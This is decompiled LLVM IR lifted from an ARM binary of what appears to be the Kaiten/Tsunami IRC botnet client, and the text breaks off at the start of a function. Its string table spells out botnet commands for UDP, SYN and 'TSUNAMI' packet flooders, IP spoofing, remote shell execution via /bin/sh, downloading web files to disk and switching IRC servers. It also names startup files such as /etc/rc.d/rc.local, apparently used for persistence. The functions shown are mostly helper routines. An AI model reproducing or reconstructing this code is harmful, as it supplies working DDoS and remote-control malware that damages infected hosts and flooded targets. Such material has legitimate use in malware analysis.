source_filename = "test"
target datalayout = "e-p:32:32:32-f80:32:32"

@r0 = internal unnamed_addr global i32 0
@r1 = internal unnamed_addr global i32 0
@r2 = internal unnamed_addr global i32 0
@r3 = internal unnamed_addr global i32 0
@r4 = internal unnamed_addr global i32 0
@r5 = internal unnamed_addr global i32 0
@r6 = internal unnamed_addr global i32 0
@r7 = internal unnamed_addr global i32 0
@r8 = internal unnamed_addr global i32 0
@sb = internal unnamed_addr global i32 0
@sl = internal unnamed_addr global i32 0
@fp = internal unnamed_addr global i32 0
@ip = internal unnamed_addr global i32 0
@sp = internal unnamed_addr global i32 0
@lr = internal unnamed_addr global i32 0
@cpsr_n = internal unnamed_addr global i1 false
@cpsr_z = internal unnamed_addr global i1 false
@cpsr_c = internal unnamed_addr global i1 false
@cpsr_v = internal unnamed_addr global i1 false
@0 = external global i32
@global_var_c180.3 = constant i32 -509558771
@global_var_2324c.6 = global i32 0
@global_var_259a0.10 = global i32 0
@global_var_188a0.12 = constant [30 x i8] c"NOTICE %s :Unable to comply.\0A\00"
@global_var_23248.14 = local_unnamed_addr global i32 0
@global_var_25ab4.16 = global i32 0
@global_var_23244.20 = global i32 0
@global_var_188c0.23 = constant [16 x i8] c"/usr/dict/words\00"
@1 = constant i32 114
@global_var_25998.29 = global i32 0
@global_var_188d4.31 = constant [25 x i8] c"%s : USERID : UNIX : %s\0A\00"
@global_var_188f0.33 = constant [33 x i8] c"NOTICE %s :GET <host> <save as>\0A\00"
@global_var_18914.35 = constant [37 x i8] c"NOTICE %s :Unable to create socket.\0A\00"
@global_var_1893c.37 = constant [8 x i8] c"http://\00"
@global_var_18944.39 = constant [39 x i8] c"NOTICE %s :Unable to resolve address.\0A\00"
@global_var_1896c.41 = constant [39 x i8] c"NOTICE %s :Unable to connect to http.\0A\00"
@global_var_18994.43 = constant [276 x i8] c"GET /%s HTTP/1.0\0D\0AConnection: Keep-Alive\0D\0AUser-Agent: Mozilla/4.75 [en] (X11; U; Linux 2.2.16-3 i686)\0D\0AHost: %s:80\0D\0AAccept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */*\0D\0AAccept-Encoding: gzip\0D\0AAccept-Language: en\0D\0AAccept-Charset: iso-8859-1,*,utf-8\0D\0A\0D\0A\00"
@global_var_18aa8.45 = constant [28 x i8] c"NOTICE %s :Receiving file.\0A\00"
@global_var_18ac4.47 = constant [3 x i8] c"wb\00"
@global_var_18ac8.49 = constant [5 x i8] c"\0D\0A\0D\0A\00"
@global_var_18ad0.51 = constant [24 x i8] c"NOTICE %s :Saved as %s\0A\00"
@global_var_18ae8.55 = constant [32 x i8] c"NOTICE %s :Spoofs: %d.%d.%d.%d\0A\00"
@global_var_18b08.57 = constant [46 x i8] c"NOTICE %s :Spoofs: %d.%d.%d.%d - %d.%d.%d.%d\0A\00"
@global_var_18b38.59 = constant [29 x i8] c"NOTICE %s :Kaiten wa goraku\0A\00"
@global_var_18b58.61 = constant [24 x i8] c"NOTICE %s :NICK <nick>\0A\00"
@global_var_18b70.63 = constant [53 x i8] c"NOTICE %s :Nick cannot be larger than 9 characters.\0A\00"
@global_var_18ba8.65 = constant [9 x i8] c"NICK %s\0A\00"
@global_var_18bb4.67 = constant [27 x i8] c"NOTICE %s :DISABLE <pass>\0A\00"
@global_var_18bd0.70 = constant [9 x i8] c"Disabled\00"
@global_var_18bdc.72 = constant [28 x i8] c"Enabled and awaiting orders\00"
@global_var_18bf8.74 = constant [35 x i8] c"NOTICE %s :Current status is: %s.\0A\00"
@global_var_18c1c.76 = constant [30 x i8] c"NOTICE %s :Already disabled.\0A\00"
@global_var_18c3c.78 = constant [37 x i8] c"NOTICE %s :Password too long! > 254\0A\00"
@global_var_25898.80 = global i32 0
@global_var_18c64.82 = constant [31 x i8] c"NOTICE %s :Disable sucessful.\0A\00"
@global_var_18c84.84 = constant [26 x i8] c"NOTICE %s :ENABLE <pass>\0A\00"
@global_var_18ca0.90 = constant [29 x i8] c"NOTICE %s :Already enabled.\0A\00"
@global_var_18cc0.93 = constant [27 x i8] c"NOTICE %s :Wrong password\0A\00"
@global_var_18cdc.95 = constant [30 x i8] c"NOTICE %s :Password correct.\0A\00"
@global_var_18cfc.97 = constant [31 x i8] c"NOTICE %s :Removed all spoofs\0A\00"
@global_var_18d1c.101 = constant [75 x i8] c"NOTICE %s :What kind of subnet address is that? Do something like: 169.40\0A\00"
@global_var_18d68.103 = constant [3 x i8] c".0\00"
@global_var_2364c.105 = global i32 0
@global_var_18d6c.108 = constant [33 x i8] c"NOTICE %s :Unable to resolve %s\0A\00"
@global_var_18d90.110 = constant [39 x i8] c"NOTICE %s :UDP <target> <port> <secs>\0A\00"
@global_var_18db8.112 = constant [26 x i8] c"NOTICE %s :Packeting %s.\0A\00"
@global_var_18dd4.114 = constant i32 2
@global_var_18e24.116 = constant [39 x i8] c"NOTICE %s :PAN <target> <port> <secs>\0A\00"
@global_var_18e4c.118 = constant [24 x i8] c"NOTICE %s :Panning %s.\0A\00"
@global_var_18e64.120 = constant [36 x i8] c"NOTICE %s :TSUNAMI <target> <secs>\0A\00"
@global_var_18e88.122 = constant [36 x i8] c"NOTICE %s :Tsunami heading for %s.\0A\00"
@global_var_18eac.124 = constant [36 x i8] c"NOTICE %s :UNKNOWN <target> <secs>\0A\00"
@global_var_18ed0.126 = constant [27 x i8] c"NOTICE %s :Unknowning %s.\0A\00"
@global_var_18eec.128 = constant [26 x i8] c"NOTICE %s :MOVE <server>\0A\00"
@global_var_25aa8.130 = global i32 0
@global_var_23238.132 = global i32 0
@global_var_18f08.134 = constant [119 x i8] c"NOTICE %s :TSUNAMI <target> <secs>                          = Special packeter that wont be blocked by most firewalls\0A\00"
@global_var_18f80.136 = constant [123 x i8] c"NOTICE %s :PAN <target> <port> <secs>                       = An advanced syn flooder that will kill most network drivers\0A\00"
@global_var_18ffc.138 = constant [77 x i8] c"NOTICE %s :UDP <target> <port> <secs>                       = A udp flooder\0A\00"
@global_var_1904c.140 = constant [93 x i8] c"NOTICE %s :UNKNOWN <target> <secs>                          = Another non-spoof udp flooder\0A\00"
@global_var_190ac.142 = constant [94 x i8] c"NOTICE %s :NICK <nick>                                      = Changes the nick of the client\0A\00"
@global_var_1910c.144 = constant [79 x i8] c"NOTICE %s :SERVER <server>                                  = Changes servers\0A\00"
@global_var_1915c.146 = constant [89 x i8] c"NOTICE %s :GETSPOOFS                                        = Gets the current spoofing\0A\00"
@global_var_191b8.148 = constant [92 x i8] c"NOTICE %s :SPOOFS <subnet>                                  = Changes spoofing to a subnet\0A\00"
@global_var_19214.150 = constant [103 x i8] c"NOTICE %s :DISABLE                                          = Disables all packeting from this client\0A\00"
@global_var_1927c.152 = constant [102 x i8] c"NOTICE %s :ENABLE                                           = Enables all packeting from this client\0A\00"
@global_var_192e4.154 = constant [80 x i8] c"NOTICE %s :KILL                                             = Kills the client\0A\00"
@global_var_19334.156 = constant [117 x i8] c"NOTICE %s :GET <http address> <save as>                     = Downloads a file off the web and saves it onto the hd\0A\00"
@global_var_193ac.158 = constant [90 x i8] c"NOTICE %s :VERSION                                          = Requests version of client\0A\00"
@global_var_19408.160 = constant [91 x i8] c"NOTICE %s :KILLALL                                          = Kills all current packeting\0A\00"
@global_var_19464.162 = constant [77 x i8] c"NOTICE %s :HELP                                             = Displays this\0A\00"
@global_var_194b4.164 = constant [96 x i8] c"NOTICE %s :IRC <command>                                    = Sends this command to the server\0A\00"
@global_var_19514.166 = constant [82 x i8] c"NOTICE %s :SH <command>                                     = Executes a command\0A\00"
@global_var_19568.169 = constant [28 x i8] c"NOTICE %s :Killing pid %d.\0A\00"
@global_var_25ab0.173 = local_unnamed_addr global i32 0
@global_var_2599c.175 = global i32 0
@global_var_195f4.177 = constant [5 x i8] c"IRC \00"
@global_var_195fc.181 = constant [4 x i8] c"%s\0A\00"
@global_var_19600.183 = constant [4 x i8] c"SH \00"
@global_var_19604.185 = constant [60 x i8] c"export PATH=/bin:/sbin:/usr/bin:/usr/local/bin:/usr/sbin;%s\00"
@global_var_19640.188 = constant [15 x i8] c"NOTICE %s :%s\0A\00"
@global_var_19650.190 = constant i32 0
@global_var_19654.194 = constant [13 x i8] c"MODE %s -xi\0A\00"
@global_var_25aac.197 = local_unnamed_addr global i32 0
@global_var_19664.199 = constant [13 x i8] c"JOIN %s :%s\0A\00"
@global_var_19674.201 = constant [8 x i8] c"WHO %s\0A\00"
@global_var_1967c.203 = constant [9 x i8] c"PONG %s\0A\00"
@global_var_19688.208 = constant [93 x i8] c"NOTICE %s :I'm having a problem resolving my host, someone will have to SPOOFS me manually.\0A\00"
@global_var_19708.221 = constant [19 x i8] c"/etc/rc.d/rc.local\00"
@global_var_1971c.224 = constant [13 x i8] c"/etc/rc.conf\00"
@global_var_1972c.226 = constant i32 47
@global_var_19730.228 = constant [8 x i8] c"\22%s%s\22\0A\00"
@global_var_19738.230 = constant i32 97
@global_var_1973c.232 = constant [6 x i8] c"-bash\00"
@global_var_259a4.236 = local_unnamed_addr global i32 0
@global_var_19744.239 = constant [4 x i8] c"#AS\00"
@global_var_19748.242 = constant i32 0
@global_var_1974c.246 = constant [41 x i8] c"NICK %s\0AUSER %s localhost localhost :%s\0A\00"
@global_var_19778.250 = constant i32 10
@global_var_1977c.252 = constant i32 42
@global_var_19780.255 = constant [6 x i8] c"ERROR\00"
@global_var_2586c.262 = global i32 0
@global_var_f134.267 = constant i32 -382906384
@global_var_11048.271 = constant i32 -382909968
@global_var_23650.276 = global i32 0
@global_var_23668.280 = local_unnamed_addr global i32 0
@global_var_19a94.289 = constant [3 x i8] c"-c\00"
@global_var_19a88.291 = constant [8 x i8] c"/bin/sh\00"
@global_var_19a90.293 = constant [3 x i8] c"sh\00"
@global_var_d700.295 = constant i32 -442695648
@global_var_da8c.309 = constant i32 -509607926
@global_var_19a98.314 = constant i32 0
@global_var_13840.315 = constant i32 -382909968
@global_var_138f4.316 = constant i32 -382910224
@global_var_19ac0.319 = constant i32 2949163
@global_var_19ab8.321 = constant [7 x i8] c"(null)\00"
@global_var_19acc.326 = constant i32 135270416
@global_var_19b12.331 = constant i32 327688
@global_var_19b2a.332 = constant i32 16843008
@global_var_19b50.337 = constant [8 x i8] c" +0-#'I\00"
@global_var_19ad4.341 = constant [9 x i8] c"hlLjztqZ\00"
@global_var_19b38.343 = constant [21 x i8] c"npxXoudifFeEgGaACScs\00"
@global_var_19b08.345 = constant i32 252117248
@global_var_19b07.346 = constant i32 117506048
@global_var_19af8.348 = constant i32 331776
@global_var_19ae8.350 = constant i32 335616
@global_var_edb0.362 = constant i32 -509607928
@global_var_f64c.394 = constant i32 -456978431
@global_var_19b68.403 = constant [8 x i8] c"Success\00"
@global_var_f700.405 = constant i32 -369093634
@global_var_25684.413 = global i32 0
@global_var_2583c.414 = global i32 0
@global_var_1016c.427 = constant i32 -478871519
@global_var_10ab8.435 = constant i32 -478805983
@global_var_11274.441 = constant i32 76
@global_var_10e94.444 = constant i32 -382906384
@global_var_25850.452 = local_unnamed_addr global i32 0
@global_var_12ec0.454 = constant i32 -509591552
@global_var_11454.460 = constant i32 -442564540
@global_var_11550.466 = constant i32 76
@global_var_1a6c4.486 = constant i32 0
@global_var_25854.501 = local_unnamed_addr global i32 0
@global_var_db88.504 = constant i32 -382909968
@global_var_11cfc.505 = constant i32 -494075872
@global_var_12eec.506 = constant i32 -382910336
@global_var_1a6ec.510 = constant [11 x i8] c"/proc/stat\00"
@global_var_1a6f8.513 = constant i32 32
@global_var_1a6fc.516 = constant [14 x i8] c"/proc/cpuinfo\00"
@global_var_1a70c.518 = constant [10 x i8] c"processor\00"
@global_var_1a730.520 = constant i32 604672
@global_var_11ebc.523 = constant i32 -369098421
@global_var_ffff.530 = constant i32 759205888
@global_var_25864.539 = local_unnamed_addr global i32 0
@global_var_25868.541 = local_unnamed_addr global i32 0
@global_var_1a734.544 = constant [10 x i8] c"/dev/null\00"
@global_var_112c4.545 = constant i32 -442543860
@global_var_10828.547 = constant i32 167772194
@global_var_daec.551 = constant i32 -382910352
@global_var_12934.568 = constant i32 -335545171
@global_var_25874.574 = local_unnamed_addr global i32 0
@global_var_12fb4.579 = constant i32 -443088884
@global_var_25870.596 = global i32 0
@global_var_1a714.599 = constant i32 114
@global_var_d7e4.600 = constant i32 -382906384
@global_var_1ad58.605 = constant [4 x i8] c"inf\00"
@global_var_1ad70.608 = constant i32 0
@global_var_1ad5b.611 = constant i32 1179535616
@global_var_1ad68.612 = constant i32 2883630
@global_var_d7f0.639 = constant i32 -480509838
@global_var_d7b8.643 = constant i32 -516948194
@global_var_1adbc.652 = constant [17 x i8] c"0123456789abcdef\00"
@global_var_1adb8.656 = constant [3 x i8] c"%x\00"
@global_var_d088.669 = constant i32 -382910336
@global_var_25e8c.670 = local_unnamed_addr global i32 0
@global_var_25878.671 = local_unnamed_addr global i32 0
@global_var_25e90.674 = local_unnamed_addr global i32 0
@global_var_16d8c.677 = constant i32 -442695584
@global_var_25e88.684 = local_unnamed_addr global i32 0
@global_var_1add0.686 = constant [17 x i8] c"/etc/resolv.conf\00"
@global_var_1ae08.695 = constant [8 x i8] c"timeout\00"
@global_var_1ae10.697 = constant [9 x i8] c"attempts\00"
@global_var_1ade4.699 = constant [11 x i8] c"nameserver\00"
@global_var_1adf0.701 = constant [7 x i8] c"domain\00"
@global_var_1adf8.703 = constant [7 x i8] c"search\00"
@global_var_1ae00.705 = constant [8 x i8] c"options\00"
@global_var_1ae1c.708 = constant i32 889192450
@global_var_15928.716 = constant i32 -382909456
@global_var_1ae2c.719 = constant [11 x i8] c"/etc/hosts\00"
@global_var_1ae38.722 = constant [4 x i8] c"# \09\00"
@global_var_1809c.724 = constant i32 -504313148
@global_var_18084.725 = constant i32 -483131392
@global_var_17f30.726 = constant i32 -481229311
@global_var_1810c.727 = constant i32 -477817729
@global_var_18448.728 = constant i32 -516685812
@global_var_1833c.729 = constant i32 -905969571
@global_var_18270.730 = constant i32 -528203771
@global_var_184d0.731 = constant i32 -478079873
@global_var_184b4.732 = constant i32 -534704125
@global_var_18464.733 = constant i32 -534704125
@global_var_183fc.734 = constant i32 -483131392
@global_var_2323c.8 = external global i8*
@global_var_23240.18 = external global i8*
@global_var_23243.210 = external local_unnamed_addr global i8*
@global_var_23242.211 = external local_unnamed_addr global i8*
@global_var_23241.212 = external local_unnamed_addr global i8*
@global_var_188d0.25 = constant [2 x i8] c"r\00"

declare void @__pseudo_branch(i32) local_unnamed_addr

declare void @__pseudo_cond_branch(i1, i32) local_unnamed_addr

define i32 @function_80b4() local_unnamed_addr {
entry:
  %v3_80b8 = load i32, i32* @r4, align 4
  call void @__pseudo_branch(i32 %v3_80b8)
  %v31_80c0 = load i32, i32* @r0, align 4
  ret i32 %v31_80c0
}

define i32 @function_80d0(i8* %arg1) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %v0_80d0 = load i1, i1* @cpsr_n, align 1
  br i1 %v0_80d0, label %bb, label %.thread

bb:                                               ; preds = %entry
  %v1_80d0 = load i32, i32* @r4, align 4
  %v2_80d0 = trunc i32 %v1_80d0 to i8
  store i8 %v2_80d0, i8* %arg1, align 1
  %v0_80d4.pr = load i1, i1* @cpsr_n, align 1
  br i1 %v0_80d4.pr, label %bb1, label %.thread

bb1:                                              ; preds = %bb
  %v1_80d4 = load i32, i32* @r4, align 4
  %v2_80d4 = trunc i32 %v1_80d4 to i8
  store i8 %v2_80d4, i8* %arg1, align 1
  br label %.thread

.thread:                                          ; preds = %entry, %bb, %bb1
  ret i32 %tmp

; uselistorder directives
  uselistorder i8* %arg1, { 1, 0, 2 }
  uselistorder label %.thread, { 2, 1, 0 }
}

define i32 @entry_point(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_4 = alloca i32, align 4
  %v4_81b8 = ptrtoint i32* %stack_var_4 to i32
  %v7_81d8 = bitcast i32* %stack_var_4 to i16*
  %v8_81d8 = call i32 @function_126a4(i32 ptrtoint (i32* @global_var_c180.3 to i32), i32 %arg2, i16* %v7_81d8, i32 32948, i32 100480, i32 %arg1, i32 %v4_81b8)
  %v0_81dc = call i32 @function_112c4()
  ret i32 %v0_81dc
}

define i32 @function_81ec(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_81ec:
  %tmp = inttoptr i32 %arg2 to i8*
  %tmp9 = ptrtoint i8* %arg1 to i32
  %stack_var_-4 = alloca i32, align 4
  %v3_81f0 = load i32, i32* @r4, align 4
  %v6_81f0 = load i32, i32* @fp, align 4
  store i32 33272, i32* %stack_var_-4, align 4
  %v2_81f4 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_81f4, i32* @fp, align 4
  %v2_8208 = load i8, i8* %arg1, align 1
  %v7_8214 = icmp eq i8 %v2_8208, 42
  br i1 %v7_8214, label %dec_label_pc_8248, label %dec_label_pc_821c

dec_label_pc_821c:                                ; preds = %dec_label_pc_81ec
  %v7_8220 = icmp eq i8 %v2_8208, 63
  br i1 %v7_8220, label %dec_label_pc_82b8, label %dec_label_pc_8228

dec_label_pc_8228:                                ; preds = %dec_label_pc_821c
  %v2_822c = icmp eq i8 %v2_8208, 0
  br i1 %v2_822c, label %dec_label_pc_8238, label %dec_label_pc_8310

dec_label_pc_8238:                                ; preds = %dec_label_pc_8228
  %v2_823c = load i8, i8* %tmp, align 1
  %v3_823c = zext i8 %v2_823c to i32
  br label %dec_label_pc_8384

dec_label_pc_8248:                                ; preds = %dec_label_pc_81ec
  %v1_824c = add i32 %tmp9, 1
  %v3_8258 = inttoptr i32 %v1_824c to i8*
  %v4_8258 = call i32 @function_81ec(i8* %v3_8258, i32 %arg2)
  %v2_8260 = icmp eq i32 %v4_8258, 0
  br i1 %v2_8260, label %dec_label_pc_82a4, label %dec_label_pc_8268

dec_label_pc_8268:                                ; preds = %dec_label_pc_8248
  %v2_826c = load i8, i8* %tmp, align 1
  %v2_8270 = icmp eq i8 %v2_826c, 0
  br i1 %v2_8270, label %dec_label_pc_82ac, label %dec_label_pc_8278

dec_label_pc_8278:                                ; preds = %dec_label_pc_8268
  %v1_827c = add i32 %arg2, 1
  %v4_8288 = call i32 @function_81ec(i8* nonnull %arg1, i32 %v1_827c)
  %v2_8290 = icmp eq i32 %v4_8288, 0
  br i1 %v2_8290, label %dec_label_pc_82a4, label %dec_label_pc_82ac

dec_label_pc_82a4:                                ; preds = %dec_label_pc_8278, %dec_label_pc_8248
  br label %dec_label_pc_82ac

dec_label_pc_82ac:                                ; preds = %dec_label_pc_8268, %dec_label_pc_8278, %dec_label_pc_82a4
  %storemerge4 = phi i32 [ 0, %dec_label_pc_82a4 ], [ 1, %dec_label_pc_8278 ], [ 1, %dec_label_pc_8268 ]
  br label %dec_label_pc_8384

dec_label_pc_82b8:                                ; preds = %dec_label_pc_821c
  %v2_82bc = load i8, i8* %tmp, align 1
  %v2_82c0 = icmp eq i8 %v2_82bc, 0
  br i1 %v2_82c0, label %dec_label_pc_8304, label %dec_label_pc_82c8

dec_label_pc_82c8:                                ; preds = %dec_label_pc_82b8
  %v1_82cc = add i32 %tmp9, 1
  %v1_82d4 = add i32 %arg2, 1
  %v2_82e0 = inttoptr i32 %v1_82cc to i8*
  %v3_82e0 = call i32 @function_81ec(i8* %v2_82e0, i32 %v1_82d4)
  %v2_82e8 = icmp ne i32 %v3_82e0, 0
  %. = zext i1 %v2_82e8 to i32
  br label %dec_label_pc_8304

dec_label_pc_8304:                                ; preds = %dec_label_pc_82c8, %dec_label_pc_82b8
  %storemerge3 = phi i32 [ 1, %dec_label_pc_82b8 ], [ %., %dec_label_pc_82c8 ]
  br label %dec_label_pc_8384

dec_label_pc_8310:                                ; preds = %dec_label_pc_8228
  %v2_8314 = load i8, i8* %arg1, align 1
  %v3_8314 = zext i8 %v2_8314 to i32
  %v1_831c = call i32 @function_d0bc(i32 %v3_8314)
  store i32 %v1_831c, i32* @r4, align 4
  %v2_8328 = load i8, i8* %tmp, align 1
  %v3_8328 = zext i8 %v2_8328 to i32
  %v1_8330 = call i32 @function_d0bc(i32 %v3_8328)
  %v0_8338 = load i32, i32* @r4, align 4
  %v9_8338 = icmp eq i32 %v0_8338, %v1_8330
  br i1 %v9_8338, label %dec_label_pc_8340, label %dec_label_pc_837c

dec_label_pc_8340:                                ; preds = %dec_label_pc_8310
  %v1_8344 = add i32 %tmp9, 1
  %v1_834c = add i32 %arg2, 1
  %v2_8358 = inttoptr i32 %v1_8344 to i8*
  %v3_8358 = call i32 @function_81ec(i8* %v2_8358, i32 %v1_834c)
  %v2_8360 = icmp ne i32 %v3_8358, 0
  %.8 = zext i1 %v2_8360 to i32
  br label %dec_label_pc_837c

dec_label_pc_837c:                                ; preds = %dec_label_pc_8340, %dec_label_pc_8310
  %storemerge = phi i32 [ 1, %dec_label_pc_8310 ], [ %.8, %dec_label_pc_8340 ]
  br label %dec_label_pc_8384

dec_label_pc_8384:                                ; preds = %dec_label_pc_8304, %dec_label_pc_82ac, %dec_label_pc_8238, %dec_label_pc_837c
  %stack_var_-48.0 = phi i32 [ %storemerge4, %dec_label_pc_82ac ], [ %storemerge3, %dec_label_pc_8304 ], [ %v3_823c, %dec_label_pc_8238 ], [ %storemerge, %dec_label_pc_837c ]
  store i32 %v3_81f0, i32* @r4, align 4
  store i32 %v6_81f0, i32* @fp, align 4
  ret i32 %stack_var_-48.0

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i8* %tmp, { 0, 2, 3, 1 }
  uselistorder i32 (i32)* @function_d0bc, { 1, 0 }
  uselistorder i32 %arg2, { 3, 2, 0, 1, 4 }
  uselistorder label %dec_label_pc_8384, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_82ac, { 2, 1, 0 }
}

define i32 @function_8398(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_8398:
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v6_839c = load i32, i32* @r2, align 4
  store i32 %v6_839c, i32* %stack_var_-8, align 4
  %v3_83a0 = load i32, i32* @fp, align 4
  store i32 33704, i32* %stack_var_-16, align 4
  %v2_83a4 = ptrtoint i32* %stack_var_-16 to i32
  store i32 %v2_83a4, i32* @fp, align 4
  %v4_83b4 = ptrtoint i32* %stack_var_-8 to i32
  store i32 ptrtoint (i32* @global_var_2324c.6 to i32), i32* @r0, align 4
  %v3_83c8 = call i32 @function_d2dc(i32 ptrtoint (i32* @global_var_2324c.6 to i32), i32 %arg2, i32 %v4_83b4)
  store i32 ptrtoint (i32* @global_var_2324c.6 to i32), i32* @r0, align 4
  %v0_83d0 = call i32 @function_f670()
  %v2_83e4 = call i32 @function_d000(i32 %arg1, i32 ptrtoint (i32* @global_var_2324c.6 to i32))
  store i32 %v3_83a0, i32* @fp, align 4
  ret i32 %v2_83e4

; uselistorder directives
  uselistorder i32* %stack_var_-16, { 1, 0 }
  uselistorder i32* %stack_var_-8, { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_2324c.6 to i32), { 1, 2, 0, 3 }
}

define i32 @function_8400(i32 %arg1) local_unnamed_addr {
dec_label_pc_8400:
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-4 = alloca i32, align 4
  %v3_8404 = load i32, i32* @fp, align 4
  store i32 33804, i32* %stack_var_-4, align 4
  %v2_8408 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_8408, i32* @fp, align 4
  %v2_8418 = load i8, i8* bitcast (i8** @global_var_2323c.8 to i8*), align 4
  %v7_841c = icmp eq i8 %v2_8418, 1
  br i1 %v7_841c, label %dec_label_pc_8424, label %dec_label_pc_8448

dec_label_pc_8424:                                ; preds = %dec_label_pc_8400
  %v2_8428 = load i32, i32* @global_var_259a0.10, align 4
  store i32 %arg1, i32* @r2, align 4
  %v3_8438 = call i32 @function_8398(i32 %v2_8428, i32 ptrtoint ([30 x i8]* @global_var_188a0.12 to i32))
  br label %dec_label_pc_8548

dec_label_pc_8448:                                ; preds = %dec_label_pc_8400
  %v0_8448 = call i32 @function_cf08()
  %v2_8458 = icmp eq i32 %v0_8448, 0
  br i1 %v2_8458, label %dec_label_pc_8460, label %dec_label_pc_846c

dec_label_pc_8460:                                ; preds = %dec_label_pc_8448
  br label %dec_label_pc_8548

dec_label_pc_846c:                                ; preds = %dec_label_pc_8448
  %v2_8470 = load i32, i32* @global_var_23248.14, align 4
  %v1_8474 = add i32 %v2_8470, 1
  store i32 %v1_8474, i32* @global_var_23248.14, align 4
  %tmp = mul i32 %v2_8470, 4
  %v3_848c = add i32 %tmp, 8
  %v1_8494 = call i32 @function_10110(i32 %v3_848c)
  %v2_84f012 = load i32, i32* @global_var_23248.14, align 4
  %v9_84fc14 = icmp eq i32 %v2_84f012, 1
  br i1 %v9_84fc14, label %dec_label_pc_8504, label %dec_label_pc_84ac

dec_label_pc_84ac:                                ; preds = %dec_label_pc_846c, %dec_label_pc_84ac
  %storemerge116 = phi i32 [ %v1_84e4, %dec_label_pc_84ac ], [ 0, %dec_label_pc_846c ]
  %v3_84b0 = mul i32 %storemerge116, 4
  %v2_84bc = add i32 %v3_84b0, %v1_8494
  %v2_84d0 = load i32, i32* @global_var_25ab4.16, align 4
  %v2_84d4 = add i32 %v2_84d0, %v3_84b0
  %v1_84d8 = inttoptr i32 %v2_84d4 to i32*
  %v2_84d8 = load i32, i32* %v1_84d8, align 4
  %v2_84dc = inttoptr i32 %v2_84bc to i32*
  store i32 %v2_84d8, i32* %v2_84dc, align 4
  %v1_84e4 = add i32 %storemerge116, 1
  %v2_84f0 = load i32, i32* @global_var_23248.14, align 4
  %v1_84f4 = add i32 %v2_84f0, -1
  %tmp25 = icmp ugt i32 %v1_84f4, %v1_84e4
  br i1 %tmp25, label %dec_label_pc_84ac, label %dec_label_pc_84ec.dec_label_pc_8504_crit_edge

dec_label_pc_84ec.dec_label_pc_8504_crit_edge:    ; preds = %dec_label_pc_84ac
  br label %dec_label_pc_8504

dec_label_pc_8504:                                ; preds = %dec_label_pc_846c, %dec_label_pc_84ec.dec_label_pc_8504_crit_edge
  %v2_84f0.lcssa = phi i32 [ %v2_84f0, %dec_label_pc_84ec.dec_label_pc_8504_crit_edge ], [ %v2_84f012, %dec_label_pc_846c ]
  %v1_8508 = add i32 %v1_8494, -4
  %v3_8514 = mul i32 %v2_84f0.lcssa, 4
  %v2_8518 = add i32 %v1_8508, %v3_8514
  %v2_8520 = inttoptr i32 %v2_8518 to i32*
  store i32 %v0_8448, i32* %v2_8520, align 4
  %v2_8528 = load i32, i32* @global_var_25ab4.16, align 4
  store i32 %v2_8528, i32* @r0, align 4
  %v0_8530 = call i32 @function_11048()
  store i32 %v1_8494, i32* @global_var_25ab4.16, align 4
  br label %dec_label_pc_8548

dec_label_pc_8548:                                ; preds = %dec_label_pc_8460, %dec_label_pc_8424, %dec_label_pc_8504
  %v3_8548 = phi i32 [ 0, %dec_label_pc_8460 ], [ 1, %dec_label_pc_8424 ], [ %v0_8448, %dec_label_pc_8504 ]
  store i32 %v3_8404, i32* @fp, align 4
  ret i32 %v3_8548

; uselistorder directives
  uselistorder i32 %v3_84b0, { 1, 0 }
  uselistorder i32 %storemerge116, { 1, 0 }
  uselistorder i32 %v2_84f012, { 1, 0 }
  uselistorder i32 %v1_8494, { 1, 2, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder label %dec_label_pc_8548, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8504, { 1, 0 }
  uselistorder label %dec_label_pc_84ac, { 1, 0 }
}

define i32 @function_8570() local_unnamed_addr {
dec_label_pc_8570:
  %v2_8584 = load i8*, i8** @global_var_23240.18, align 4
  %v3_8584 = ptrtoint i8* %v2_8584 to i32
  %v2_8588 = icmp eq i8* %v2_8584, null
  br i1 %v2_8588, label %dec_label_pc_8590, label %dec_label_pc_85a0

dec_label_pc_8590:                                ; preds = %dec_label_pc_8570
  %v0_8590 = call i32 @function_113ec()
  br label %dec_label_pc_860c

dec_label_pc_85a0:                                ; preds = %dec_label_pc_8570
  %v2_85a4 = load i32, i32* @global_var_23244.20, align 4
  %v7_85a8 = icmp eq i32 %v2_85a4, 1
  br i1 %v7_85a8, label %dec_label_pc_85b0, label %dec_label_pc_85c8

dec_label_pc_85b0:                                ; preds = %dec_label_pc_85a0
  %v2_85bc = call i32 @function_fc94(i32 %v3_8584)
  br label %dec_label_pc_860c

dec_label_pc_85c8:                                ; preds = %dec_label_pc_85a0
  %v0_85c8 = call i32 @function_113ec()
  %v2_85d8 = load i32, i32* @global_var_23244.20, align 4
  %v2_85e4 = call i32 @function_cc2c(i32 %v0_85c8, i32 %v2_85d8)
  %v2_85f4 = load i8*, i8** @global_var_23240.18, align 4
  %v3_85f4 = ptrtoint i8* %v2_85f4 to i32
  %v2_85f8 = add i32 %v2_85d8, 1
  %v1_85fc = add i32 %v2_85f8, %v3_85f4
  %v1_8604 = call i32 @function_fc94(i32 %v1_85fc)
  br label %dec_label_pc_860c

dec_label_pc_860c:                                ; preds = %dec_label_pc_85b0, %dec_label_pc_8590, %dec_label_pc_85c8
  %stack_var_-20.0 = phi i32 [ %v0_8590, %dec_label_pc_8590 ], [ %v2_85bc, %dec_label_pc_85b0 ], [ %v1_8604, %dec_label_pc_85c8 ]
  ret i32 %stack_var_-20.0

; uselistorder directives
  uselistorder i32 (i32)* @function_fc94, { 1, 0 }
  uselistorder label %dec_label_pc_860c, { 2, 0, 1 }
}

define i32 @function_8628(i32 %arg1) local_unnamed_addr {
dec_label_pc_8628:
  %stack_var_0 = alloca i32, align 4
  %v1_8628 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v1_8628, i32* @ip, align 4
